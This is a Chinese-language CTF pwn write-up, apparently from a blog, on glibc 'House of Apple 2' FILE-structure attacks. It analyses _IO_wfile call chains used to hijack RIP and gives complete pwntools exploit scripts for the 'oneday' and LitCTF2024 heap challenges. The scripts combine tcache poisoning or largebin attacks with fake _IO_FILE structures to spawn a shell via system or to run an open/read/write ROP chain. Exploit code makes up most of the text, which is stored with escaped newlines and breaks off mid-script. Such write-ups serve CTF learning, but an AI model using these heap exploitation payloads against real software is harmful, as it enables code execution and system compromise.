= B\n  _wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C\n\n\n函数的调用链如下：\n\n1\n2\n3\n4\n_IO_wfile_underflow_mmap\n    _IO_wdoallocbuf\n        _IO_WDOALLOCATE\n            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)\n\n\n详细分析如下：\n看_IO_wfile_underflow_mmap函数：\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\nstatic wint_t\n_IO_wfile_underflow_mmap (FILE *fp)\n{\n  struct _IO_codecvt *cd;\n  const char *read_stop;\n \n  if (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))\n    {\n      fp-&gt;_flags |= _IO_ERR_SEEN;\n      __set_errno (EBADF);\n      return WEOF;\n    }\n  if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)\n    return *fp-&gt;_wide_data-&gt;_IO_read_ptr;\n \n  cd = fp-&gt;_codecvt;\n \n  /* Maybe there is something left in the external buffer.  */\n  if (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end\n      /* No.  But maybe the read buffer is not fully set up.  */\n      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)\n    /* Nothing available.  _IO_file_underflow_mmap has set the EOF or error\n       flags as appropriate.  */\n    return WEOF;\n \n  /* There is more in the external.  Convert it.  */\n  read_stop = (const char *) fp-&gt;_IO_read_ptr;\n \n  if (fp-&gt;_wide_data-&gt;_IO_buf_base == NULL)\n    {\n      /* Maybe we already have a push back pointer.  */\n      if (fp-&gt;_wide_data-&gt;_IO_save_base != NULL)\n    {\n      free (fp-&gt;_wide_data-&gt;_IO_save_base);\n      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;\n    }\n      _IO_wdoallocbuf (fp);// 需要走到这里\n    }\n    //......\n}\n\n\n需要设置fp-&gt;_flags &amp; _IO_NO_READS == 0，设置fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end，设置fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end不进入调用，设置fp-&gt;_wide_data-&gt;_IO_buf_base == NULL和fp-&gt;_wide_data-&gt;_IO_save_base == NULL。\n\n利用_IO_wdefault_xsgetn函数控制程序执行流\n\n这条链执行的条件是调用到_IO_wdefault_xsgetn时rdx寄存器，也就是第三个参数不为0。如果不满足这个条件，可选用其他链。\n\n对fp的设置如下：\n\n\n  _flags设置为0x800\n  vtable设置为_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps地址（加减偏移），使其能成功调用_IO_wdefault_xsgetn即可\n  _mode设置为大于0，即满足*(fp + 0xc0) &gt; 0\n  _wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A\n  _wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr设置为0，即满足*(A + 8) = *A\n  _wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base，即满足*(A + 0x20) &gt; *(A + 0x18)\n  _wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B\n  _wide_data-&gt;_wide_vtable-&gt;overflow设置为地址C用于劫持RIP，即满足*(B + 0x18) = C\n\n\n函数的调用链如下：\n\n1\n2\n3\n4\n5\n_IO_wdefault_xsgetn\n    __wunderflow\n        _IO_switch_to_wget_mode\n            _IO_WOVERFLOW\n                *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)\n\n\n详细分析如下：\n首先看_IO_wdefault_xsgetn函数：\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\nsize_t\n_IO_wdefault_xsgetn (FILE *fp, void *data, size_t n)\n{\n  size_t more = n;\n  wchar_t *s = (wchar_t*) data;\n  for (;;)\n    {\n      /* Data available. */\n      ssize_t count = (fp-&gt;_wide_data-&gt;_IO_read_end\n                       - fp-&gt;_wide_data-&gt;_IO_read_ptr);\n      if (count &gt; 0)\n    {\n      if ((size_t) count &gt; more)\n        count = more;\n      if (count &gt; 20)\n        {\n          s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);\n          fp-&gt;_wide_data-&gt;_IO_read_ptr += count;\n        }\n      else if (count &lt;= 0)\n        count = 0;\n      else\n        {\n          wchar_t *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;\n          int i = (int) count;\n          while (--i &gt;= 0)\n        *s++ = *p++;\n          fp-&gt;_wide_data-&gt;_IO_read_ptr = p;\n            }\n            more -= count;\n        }\n      if (more == 0 || __wunderflow (fp) == WEOF)\n    break;\n    }\n  return n - more;\n}\nlibc_hidden_def (_IO_wdefault_xsgetn)\n\n\n由于more是第三个参数，所以不能为0。\n直接设置fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end，使得count为0，不进入if分支。\n随后当more != 0时会进入__wunderflow。\n\n接着看__wunderflow：\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\nwint_t\n__wunderflow (FILE *fp)\n{\n  if (fp-&gt;_mode &lt; 0 || (fp-&gt;_mode == 0 &amp;&amp; _IO_fwide (fp, 1) != 1))\n    return WEOF;\n \n  if (fp-&gt;_mode == 0)\n    _IO_fwide (fp, 1);\n  if (_IO_in_put_mode (fp))\n    if (_IO_switch_to_wget_mode (fp) == EOF)\n      return WEOF;\n    // ......\n}\n\n\n要想调用到_IO_switch_to_wget_mode，需要设置fp-&gt;mode &gt; 0，并且fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0。\n\n然后在_IO_switch_to_wget_mode函数中：\n\n1\n2\n3\n4\n5\n6\n7\n8\nint\n_IO_switch_to_wget_mode (FILE *fp)\n{\n  if (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)\n    if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF) // 需要走到这里\n      return EOF;\n    // .....\n}\n\n\n当满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base时就会调用_IO_WOVERFLOW(fp)。\n\n例题分析\n\noneday\n\nhouse of apple2解法\n\n前文有结构体内容，是利用_IO_wfile_overflow函数控制程序执行流\n\nexp:\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n194\n195\n196\n197\n198\n199\n200\n201\n202\n203\n204\n205\n206\n207\n208\n209\n210\n211\n212\n213\n214\n215\n216\n217\n218\n219\n220\n221\n222\n223\n224\n225\n226\n227\n228\n229\n230\n231\n232\nfrom pwn import *\nfrom ctypes import *\n\npwn = './oneday'\nlibc = ELF('./libc.so.6')\nif args['REMOTE']:\n    io = remote('192.168.18.22', 8888)\nelse:\n    io = process(pwn)\n\ncontext(log_level='debug')\n#context.terminal = ['tmux','splitw','-h']\ncontext.binary = elf = ELF(pwn)\nrop = ROP(context.binary)\n\ns = lambda data: io.send(data)\nsa = lambda text, data: io.sendafter(text, data)\nsl = lambda data: io.sendline(data)\nsla = lambda text, data: io.sendlineafter(text, data)\nr = lambda num=4096: io.recv(num)\nru = lambda text: io.recvuntil(text)\npr = lambda num=4096: print(io.recv(num))\ninter = lambda: io.interactive()\n\nl32 = lambda: u32(io.recvuntil(b'\\xf7')[-4:].ljust(4, b'\\x00'))\nl64 = lambda: u64(io.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))\nuu32 = lambda: u32(io.recv(4).ljust(4, b'\\x00'))\nuu32_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(8), 16)\nuu64 = lambda: u64(io.recv(6).ljust(8, b'\\x00'))\nuu64_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(12), 16)\nuuu64 = lambda: u64(ru(b'\\x7f')[-6:].ljust(8, b'\\x00'))\nuuuu64 = lambda target: u64((ru(target)[-1:] + r(5)).ljust(8, b'\\x00'))\n\nint16 = lambda data: int(data, 16)\n\nlg = lambda s, num: io.success('%s -&gt; 0x%x' % (s, num))\n\ndef get_sb():\n    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\\x00'))\n\ndef get_orw():\n    return libc_base + libc.sym['open'], libc_base + libc.sym['read'], libc_base + libc.sym['write']\n\ndef debug(breakpoints=None):\n    if breakpoints is None:\n        breakpoints = [\"__call_tls_dtors\"]\n    elif isinstance(breakpoints, str):\n        breakpoints = [breakpoints]\n    script = \"\"\n    for bp in breakpoints:\n        script += f\"b {bp}\\n\"\n    gdb.attach(proc.pidof(io)[0], script)\n    pause()\n\ndef fmt(value, offset=14, size='hhn'):\n    if size == 'hhn':\n        num = value &amp; 0xff\n    elif size == 'hn':\n        num = value &amp; 0xffff\n    elif size == 'n':\n        num = value &amp; 0xffffffff\n    payload = f\"%{num}c%{offset}${size}\".encode()\n    #value 是格式化字符串偏移          \n    return payload\n\nlss = lambda s: log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))\n\ndef cat_flag():\n    flag_header = b'flag{'\n    sleep(1)\n    sl('cat flag')\n    ru(flag_header)\n    flag = flag_header + ru('}') + b'}'\n    exit(0)\n\n#asm(shellcraft.sh()).ljust(0x108,b'a')\n\ndef set_key(key):\n    sla(b'key &gt;&gt;\\n',str(key))\n\ndef add(choise):\n   sla(b'command:',b'1')\n   sla(b'choise: ',str(choise))\n\ndef dele(idx):\n    sla(b'command: \\n',b'2')\n    sla(b'Index: ',str(idx))\n\ndef edit(idx,commend):\n    sla(b'command:',b'3')\n    sla(b'Index: ',str(idx))\n    sa(b'Message: \\n',commend)\ndef show(idx):\n    sla(b'command:',b'4')   \n    sla(b'Index: ',str(idx))\n   \ndef exit():\n    sla(b'command:',b'6')  \n\nset_key(10)\n\nadd(2) #0\nadd(2) #1\nadd(1) #2\ndele(2)\ndele(1)\ndele(0)\n\nadd(1) #3\nadd(1) #4\nadd(1) #5\nadd(1) #6\n\ndele(3)\ndele(5)\nshow(3)\n\nru(b'Message: \\n')\nlibc_base = uu64() - 0x1f2cc0\nlg(b'libc_base',libc_base)\nio.recv(2)\nheap_base = uu64() - 0x17f0\nlg(b'heap_base',heap_base)\n\n\ndele(4)\ndele(6)\nadd(3) #7\nadd(1) #8\nadd(1) #9\npause()\ndele(8)\nadd(3)\n\n\ntarget_addr = libc_base + libc.sym['_IO_list_all'] \nlg(b'_IO_list_all',target_addr)\n_IO_wstrn_jumps = libc_base + libc.sym['_IO_wstrn_jumps']\n_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']\n_IO_stdfile_1_lock = libc_base + 0x1f5720\nf1 = FileStructure()\nf1._IO_read_ptr = 0xa81\nf1.flags = p64(heap_base + 0x2000)\nf1._IO_save_base = p64(heap_base+0x1a00)\nf1._lock = _IO_stdfile_1_lock\nfake_IO_FILE = heap_base + 0x1810\nf1._wide_data = fake_IO_FILE + 0xe0\nf1.vtable = _IO_wfile_jumps\n\nsetcontext = libc_base + libc.sym['setcontext']\npop_rdi = libc_base + 0x2daa2\nret = pop_rdi+1\npop_rax = libc_base + 0x446c0\npop_rsi = libc_base + 0x37c0a\npop_rdx_rbx = libc_base + 0x87729 \nsyscall = libc_base + 0x883b6\n\nmagic_gadget = libc_base + 0x146020\nmagic = libc_base + 0x1482BA\n\nlg(b'fake_IO_FILE',fake_IO_FILE)\ndata = flat({\n    0x8: target_addr - 0x20,\n    0x10:{\n        0:{\n           0:bytes(f1),\n           0xe0: {\n               0x18: 0,\n               0x30: 0,\n               0xe0: fake_IO_FILE + 0x200,\n               0x110:0x20,\n           },\n           0x200:   \n                {\n                0x0: heap_base + 0x1d00,\n                0x8: heap_base + 0x1a00,\n                0x10: setcontext + 61,\n                0x18: magic_gadget,\n                0x68: magic,\n                0x90: heap_base + 0x1d10,  #rop链的入口\n                0x98: ret\n\n\n                    },\n           0x300: {\n               0x0: 0,\n               0x8:heap_base+0x300,\n               0x10: 'flag\\x00\\x00\\x00\\x00',\n               0x20: setcontext+61\n           },         \n           0x500: [\n               pop_rax,\n               2,\n               pop_rdi,\n               heap_base + 0x1b20,\n               pop_rsi,\n               0,\n               syscall,\n\n               pop_rax,\n               0,\n               pop_rdi,\n               3,\n               pop_rsi,\n               heap_base + 0x500,\n               pop_rdx_rbx,\n               0x40,\n               0,\n               syscall,\n\n               pop_rax,\n               1,\n               pop_rdi,\n               1,\n               pop_rsi,\n               heap_base + 0x500,\n               pop_rdx_rbx,\n               0x40,\n               0,\n               syscall\n           ]\n              \n        },\n        0xa80:[0,0xab1]\n    }\n})\ndebug(\"call (void)signal(SIGALRM, SIG_IGN)\") \nedit(5,data)\ndele(2)\nadd(3)\nexit()\ninter()\n\n\nLitCTF2024 heap2.35\n\nchunk无大小限制的uaf，所以tcache写_IO_list_all，打House of apple即可。\n\n网上有很多方法\n\n但是哥们学习了这两种直接拿shell的\n\n方法1: house of apple2+tcachebin attack\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\nfrom pwn import *\nfrom ctypes import *\n\npwn = './heap'\nlibc = ELF('./libc.so.6')\n\nif args['REMOTE']:\n    io = remote('192.168.18.22', 8888)\nelse:\n    io = process(pwn)\n\ncontext(log_level='debug')\n#context.terminal = ['tmux','splitw','-h']\ncontext.binary = elf = ELF(pwn)\nrop = ROP(context.binary)\n\ns = lambda data: io.send(data)\nsa = lambda text, data: io.sendafter(text, data)\nsl = lambda data: io.sendline(data)\nsla = lambda text, data: io.sendlineafter(text, data)\nr = lambda num=4096: io.recv(num)\nru = lambda text: io.recvuntil(text)\npr = lambda num=4096: print(io.recv(num))\ninter = lambda: io.interactive()\n\nl32 = lambda: u32(io.recvuntil(b'\\xf7')[-4:].ljust(4, b'\\x00'))\nl64 = lambda: u64(io.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))\nuu32 = lambda: u32(io.recv(4).ljust(4, b'\\x00'))\nuu32_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(8), 16)\nuu64 = lambda: u64(io.recv(6).ljust(8, b'\\x00'))\nuu64_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(12), 16)\nuuu64 = lambda: u64(ru(b'\\x7f')[-6:].ljust(8, b'\\x00'))\nuuuu64 = lambda target: u64((ru(target)[-1:] + r(5)).ljust(8, b'\\x00'))\n\nint16 = lambda data: int(data, 16)\n\nlg = lambda s, num: io.success('%s -&gt; 0x%x' % (s, num))\n\ndef get_sb():\n    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\\x00'))\n\ndef get_orw():\n    return libc_base + libc.sym['open'], libc_base + libc.sym['read'], libc_base + libc.sym['write']\n\ndef debug(breakpoints=None):\n    if breakpoints is None:\n        breakpoints = [\"__call_tls_dtors\"]\n    elif isinstance(breakpoints, str):\n        breakpoints = [breakpoints]\n    script = \"\"\n    for bp in breakpoints:\n        script += f\"b {bp}\\n\"\n    gdb.attach(proc.pidof(io)[0], script)\n    pause()\n\ndef fmt(value, offset=14, size='hhn'):\n    if size == 'hhn':\n        num = value &amp; 0xff\n    elif size == 'hn':\n        num = value &amp; 0xffff\n    elif size == 'n':\n        num = value &amp; 0xffffffff\n    payload = f\"%{num}c%{offset}${size}\".encode()\n    #value 是格式化字符串偏移          \n    return payload\n\nlss = lambda s: log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))\n\ndef cat_flag():\n    flag_header = b'flag{'\n    sleep(1)\n    sl('cat flag')\n    ru(flag_header)\n    flag = flag_header + ru('}') + b'}'\n    exit(0)\n\n#asm(shellcraft.sh()).ljust(0x108,b'a')\n\ndef add(idx,size):\n    sla(b'&gt;&gt;',b'1')\n    sla(b'idx? ',str(idx).encode())\n    sla(b'size? ',str(size).encode())\n\ndef dele(idx):\n    sla(b'&gt;&gt;',b'2')\n    sla(b'idx? ',str(idx).encode())\n\ndef show(idx):\n    sla(b'&gt;&gt;',b'3')\n    sla(b'idx? ',str(idx).encode())\n\ndef edit(idx,commend):\n    sla(b'&gt;&gt;',b'4')\n    sla(b'idx? ',str(idx).encode())\n    sa(b'content :',commend)\n\ndef exit():\n    sla(b'&gt;&gt;',b'5')\n\n\nadd(0,0x500)\nadd(1,0x10)\n\ndele(0)\nshow(0)\nru(b'content : ')\nlibc_base = uu64() - 0x21ace0\nmain_arena = libc_base + 0x21ac80\nlg(b'libc_base',libc_base)\nlg(b'main_arena',main_arena)\n\n\nadd(0xf,0x500)\nadd(2,0x20)\nadd(3,0x20)\ndele(2)  #产生tcache bin0\ndele(3)  #产生tcache bin1\n#可以得到 tcache bin1 -&gt; fd =  tcache bin0\nshow(2)\nru(b'content : ')\nheap_base = u64(io.recv(5).ljust(8, b'\\x00')) &lt;&lt; 12\nlg(b'heap_base',heap_base)\n\nkey = heap_base &gt;&gt; 12\n_IO_list_all = libc_base + libc.sym['_IO_list_all']\n\ndebug()\nedit(3,p64(_IO_list_all ^ key))\n#修改后：可以得到 tcache bin1 -&gt; fd =  (_IO_list_all ^ key)，经过malloc后返回的就是_IO_list_all的地址\n\nadd(4,0x20) #申请的tcache bin1\nadd(5,0x20) #申请的fake_chunk(_IO_list_all的位置)\n\nadd(6,0x1000)\nadd(7,0x1000)\nadd(8,0x1000)\n\nfake_IO_1_addr = heap_base + 0x10 + 2080  #即是fake_IO_file的地址\nfake_IO_2_addr = heap_base + 0x10 + 6192  #即是pad3的地址\nfake_IO_3_addr = heap_base + 0x10 + 10304 #既是pad4的地址\nsys_addr = libc_base + libc.sym['system']\n_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']\n\nfake_IO_file = b''\nfake_IO_file += b' sh;'.ljust(0x8,b'\\x00')+p64(0x1101)\nfake_IO_file = fake_IO_file.ljust(0x28,b'\\x00')\nfake_IO_file += p64(1)  # _IO_write_ptr\nfake_IO_file = fake_IO_file.ljust(0xa0,b'\\x00')\nfake_IO_file += p64(fake_IO_2_addr)  # _wide_data = fake_IO_2_addr  \nfake_IO_file = fake_IO_file.ljust(0xd8,b'\\x00')\nfake_IO_file += p64(_IO_wfile_jumps) # vtable = IO_wfile_jumps\n\nedit(6,fake_IO_file) \n\npad3 = b''\npad3 += p64(0) * 28\npad3 += p64(fake_IO_3_addr) #vtable\n\nedit(7,pad3)\n\npad4 = b''\npad4 += p64(0) * 13\npad4 += p64(sys_addr)  #chain\nedit(8,pad4)\nedit(5,p64(fake_IO_1_addr))  #触发tcache poisoning，直接修改_IO_list_all的内容\n\nlg(b'fake_IO_1_addr',fake_IO_1_addr)\nlg(b'fake_IO_2_addr',fake_IO_2_addr)\nlg(b'fake_IO_3_addr',fake_IO_3_addr)\npause()\nexit()\n\ninter()\n\n\n方法2：house of apple2+tcachebin attack\n\ntcache bin的fd指针修改\n\n修改前\n\n\n\n修改后\n\n\n\n\n\n由于我们修改了tcachebin1的fd指针，导致我们第二次申请的同样大小的堆块时，会直接申请的是返回_IO_2_1_stderr的地址，这导致我们可以直接修改__IO_2_1_stderr所在的内容，就可以触发tcache poisoning\n\n写入fake_IO_file结构体前：\n\n\n\n写入后：\n\n\n\n这里需要解释一下wide_data为什么存放的是stderr-0x40的地址，因为wide_data的地址加上0x68就是我们可以直接控制的rip的地址，可以执行onegadget，magic，system函数等等\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\nfrom pwn import *\nfrom ctypes import *\n\npwn = './heap'\nlibc = ELF('./libc.so.6')\n\nif args['REMOTE']:\n    io = remote('192.168.18.22', 8888)\nelse:\n    io = process(pwn)\n\ncontext(log_level='debug')\n#context.terminal = ['tmux','splitw','-h']\ncontext.binary = elf = ELF(pwn)\nrop = ROP(context.binary)\n\ns = lambda data: io.send(data)\nsa = lambda text, data: io.sendafter(text, data)\nsl = lambda data: io.sendline(data)\nsla = lambda text, data: io.sendlineafter(text, data)\nr = lambda num=4096: io.recv(num)\nru = lambda text: io.recvuntil(text)\npr = lambda num=4096: print(io.recv(num))\ninter = lambda: io.interactive()\n\nl32 = lambda: u32(io.recvuntil(b'\\xf7')[-4:].ljust(4, b'\\x00'))\nl64 = lambda: u64(io.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))\nuu32 = lambda: u32(io.recv(4).ljust(4, b'\\x00'))\nuu32_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(8), 16)\nuu64 = lambda: u64(io.recv(6).ljust(8, b'\\x00'))\nuu64_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(12), 16)\nuuu64 = lambda: u64(ru(b'\\x7f')[-6:].ljust(8, b'\\x00'))\nuuuu64 = lambda target: u64((ru(target)[-1:] + r(5)).ljust(8, b'\\x00'))\n\nint16 = lambda data: int(data, 16)\n\nlg = lambda s, num: io.success('%s -&gt; 0x%x' % (s, num))\n\ndef get_sb():\n    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\\x00'))\n\ndef get_orw():\n    return libc_base + libc.sym['open'], libc_base + libc.sym['read'], libc_base + libc.sym['write']\n\ndef debug(breakpoints=None):\n    if breakpoints is None:\n        breakpoints = [\"__call_tls_dtors\"]\n    elif isinstance(breakpoints, str):\n        breakpoints = [breakpoints]\n    script = \"\"\n    for bp in breakpoints:\n        script += f\"b {bp}\\n\"\n    gdb.attach(proc.pidof(io)[0], script)\n    pause()\n\ndef fmt(value, offset=14, size='hhn'):\n    if size == 'hhn':\n        num = value &amp; 0xff\n    elif size == 'hn':\n        num = value &amp; 0xffff\n    elif size == 'n':\n        num = value &amp; 0xffffffff\n    payload = f\"%{num}c%{offset}${size}\".encode()\n    #value 是格式化字符串偏移          \n    return payload\n\nlss = lambda s: log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))\n\ndef cat_flag():\n    flag_header = b'flag{'\n    sleep(1)\n    sl('cat flag')\n    ru(flag_header)\n    flag = flag_header + ru('}') + b'}'\n    exit(0)\n\n#asm(shellcraft.sh()).ljust(0x108,b'a')\n\ndef add(idx,size):\n    sla(b'&gt;&gt;',b'1')\n    sla(b'idx? ',str(idx).encode())\n    sla(b'size? ',str(size).encode())\n\ndef dele(idx):\n    sla(b'&gt;&gt;',b'2')\n    sla(b'idx? ',str(idx).encode())\n\ndef show(idx):\n    sla(b'&gt;&gt;',b'3')\n    sla(b'idx? ',str(idx).encode())\n\ndef edit(idx,commend):\n    sla(b'&gt;&gt;',b'4')\n    sla(b'idx? ',str(idx).encode())\n    sa(b'content :',commend)\n\ndef exit():\n    sla(b'&gt;&gt;',b'5')\n\n\nadd(0,0x100)\ndele(0)\nshow(0)\n\nru('content :')\nheap_base = (((u64(io.recv(6).ljust(8,b\"\\x00\")) &gt;&gt; 4)&lt;&lt;12)-0x2000)&gt;&gt;4\nlog.success(f'heap_base:{heap_base:#x}')\nadd(1,0x500)\nadd(2,0x10)\ndele(1)\nshow(1)\nru(b'content : ')\nlibc_base = uu64()-2206944\n\nlog.success(f'libc_base:{libc_base:#x}')\n\nadd(3,0x100)\nadd(4,0x100)\ndele(3) #产生tcache bin0\ndele(4) #产生tcache bin1\n\n#tcache bin1 -&gt; fd = tcache bin0 \n\nstderr = libc_base + libc.sym['_IO_2_1_stderr_']\nsys_addr = libc_base + libc.sym['system']\n\nkey = (heap_base + 0x3b0)&gt;&gt;12\nedit(4,p64(key^stderr)) #修改chunk4的fd\n\ndebug()\nadd(5,0x100) \nadd(6,0x100)\n\nfake_file = flat({\n    0x0: b\"  sh;\",\n    0x28: sys_addr,\n    0xa0: stderr-0x40,   # _wide_data\n    0xD8: libc_base + libc.sym['_IO_wfile_jumps'], # jumptable \n}, filler=b\"\\x00\")\n\nedit(6,fake_file)\nexit()\n\ninter()\n\n\n方法3: largebin attack+house of apple2\n\n自学的\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\nfrom pwn import *\nfrom ctypes import *\nfrom pwncli import *\npwn = './heap'\nlibc = ELF('./libc.so.6')\n\nif args['REMOTE']:\n    io = remote('192.168.18.22', 8888)\nelse:\n    io = process(pwn)\n\ncontext(log_level='debug')\n#context.terminal = ['tmux','splitw','-h']\ncontext.binary = elf = ELF(pwn)\nrop = ROP(context.binary)\n\ns = lambda data: io.send(data)\nsa = lambda text, data: io.sendafter(text, data)\nsl = lambda data: io.sendline(data)\nsla = lambda text, data: io.sendlineafter(text, data)\nr = lambda num=4096: io.recv(num)\nru = lambda text: io.recvuntil(text)\npr = lambda num=4096: print(io.recv(num))\ninter = lambda: io.interactive()\n\nl32 = lambda: u32(io.recvuntil(b'\\xf7')[-4:].ljust(4, b'\\x00'))\nl64 = lambda: u64(io.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))\nuu32 = lambda: u32(io.recv(4).ljust(4, b'\\x00'))\nuu32_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(8), 16)\nuu64 = lambda: u64(io.recv(6).ljust(8, b'\\x00'))\nuu64_hex = lambda: int(io.recvuntil(b'0x', drop=True) + r(12), 16)\nuuu64 = lambda: u64(ru(b'\\x7f')[-6:].ljust(8, b'\\x00'))\nuuuu64 = lambda target: u64((ru(target)[-1:] + r(5)).ljust(8, b'\\x00'))\n\nint16 = lambda data: int(data, 16)\n\nlg = lambda s, num: io.success('%s -&gt; 0x%x' % (s, num))\n\ndef get_sb():\n    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\\x00'))\n\ndef get_orw():\n    return libc_base + libc.sym['open'], libc_base + libc.sym['read'], libc_base + libc.sym['write']\n\ndef debug(breakpoints=None):\n    if breakpoints is None:\n        breakpoints = [\"__call_tls_dtors\"]\n    elif 